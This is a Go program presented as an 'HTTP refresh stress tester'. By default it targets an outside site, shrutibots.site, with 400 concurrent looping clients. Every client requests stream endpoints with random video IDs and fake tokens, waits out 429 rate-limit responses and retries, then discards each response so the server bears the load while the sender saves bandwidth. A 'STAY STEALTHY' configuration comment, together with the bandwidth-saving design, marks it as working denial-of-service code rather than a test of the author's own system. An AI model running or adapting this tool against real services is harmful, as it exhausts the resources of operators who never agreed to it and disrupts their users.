package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"sync"
	"syscall"
	"time"
)

// ==========================================
// CONFIGURATION (STAY STEALTHY)
// ==========================================
var (
	SERVER_URL    = getEnv("TARGET_URL", "https://shrutibots.site/")
	TOTAL_CLIENTS = 400                       // Number of concurrent refresh clients
	MAX_WORKERS   = 400
	REFRESH_DELAY = 500 * time.Millisecond // Lower = heavier stress
)

// Worker Semaphore to limit max workers
var workerSemaphore = make(chan struct{}, MAX_WORKERS)

const ytIDChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

func init() {
	rand.Seed(time.Now().UnixNano())
}

// ==========================================
// HELPERS
// ==========================================
func getEnv(key, defaultValue string) string {
	if value, exists := os.LookupEnv(key); exists {
		return value
	}
	return defaultValue
}

// Generates a random 11-character string to simulate a YouTube ID
func generateRandomYouTubeID() string {
	b := make([]byte, 11)
	for i := range b {
		b[i] = ytIDChars[rand.Intn(len(ytIDChars))]
	}
	return string(b)
}

// Generates a random string to simulate a randomized token
func generateRandomToken() string {
	b := make([]byte, 16)
	for i := range b {
		b[i] = ytIDChars[rand.Intn(len(ytIDChars))]
	}
	return "fake_token_" + string(b)
}

// ==========================================
// CLIENT STRUCT
// ==========================================
type StressClient struct {
	clientID     int
	running      bool
	lastActivity time.Time
	lock         sync.Mutex
	httpClient   *http.Client
}

func NewStressClient(id int) *StressClient {
	return &StressClient{
		clientID: id,
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
		},
	}
}

func (c *StressClient) DoRefresh() {
	c.lock.Lock()
	c.lastActivity = time.Now()
	c.lock.Unlock()

	vidID := generateRandomYouTubeID()
	fakeToken := generateRandomToken()
	
	// Define the backoff intervals for 429 responses (5s, then 10s)
	backoffDelays := []time.Duration{5 * time.Second, 10 * time.Second}

	// DIRECTLY request the stream endpoint using the fake token
	streamURL := fmt.Sprintf("%sstream/%s?type=audio&token=%s", SERVER_URL, vidID, fakeToken)
	var resp *http.Response

	for attempt := 0; attempt <= len(backoffDelays); attempt++ {
		req, err := http.NewRequest("GET", streamURL, nil)
		if err != nil {
			log.Printf("[Client %d] Stream NewRequest failed: %v", c.clientID, err)
			return
		}

		resp, err = c.httpClient.Do(req)
		if err != nil {
			log.Printf("[Client %d] Stream Request error: %v", c.clientID, err)
			return
		}

		// Handle 429 Too Many Requests
		if resp.StatusCode == 429 {
			resp.Body.Close()
			if attempt < len(backoffDelays) {
				log.Printf("[Client %d] Stream API returned 429 for ID %s. Waiting %v before retry...", c.clientID, vidID, backoffDelays[attempt])
				time.Sleep(backoffDelays[attempt])
				continue
			} else {
				log.Printf("[Client %d] Stream API returned 429 for ID %s. Max retries reached. Dropping.", c.clientID, vidID)
				return
			}
		}

		// If not 429, break out of the retry loop
		break
	}
	
	// DROP THE REQUEST: Immediately close the body without using io.Copy
	// This abandons the payload while still forcing the server to process the API request
	resp.Body.Close()

	log.Printf("[Client %d] Success! Stream Requested & Dropped -> Status: %d | ID: %s | Token: %s", c.clientID, resp.StatusCode, vidID, fakeToken)
}

func (c *StressClient) Run() {
	c.running = true
	workerSemaphore <- struct{}{}
	defer func() { <-workerSemaphore }()

	for c.running {
		c.DoRefresh()
		time.Sleep(REFRESH_DELAY)
		runtime.Gosched()
	}
}

func main() {
	log.SetFlags(log.LstdFlags | log.Lmsgprefix)
	debug.SetMemoryLimit(850 * 1024 * 1024)
	runtime.GOMAXPROCS(runtime.NumCPU())

	log.Println("========================================")
	log.Println(" KING-CLAIMER HTTP REFRESH STRESS TESTER ")
	log.Printf(" Target: %s", SERVER_URL)
	log.Printf(" Clients: %d | Workers: %d | Delay: %v", TOTAL_CLIENTS, MAX_WORKERS, REFRESH_DELAY)
	log.Println(" Mode: Direct Stream Request + Fake Token (Bandwidth Saver)")
	log.Println(" Purpose: Test regional routing + load balancing")
	log.Println("========================================")

	var wg sync.WaitGroup
	for i := 0; i < TOTAL_CLIENTS; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			client := NewStressClient(id)
			client.Run()
		}(i)
	}

	done := make(chan os.Signal, 1)
	signal.Notify(done, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-done

	log.Println("Shutting down gracefully...")
	wg.Wait()
}
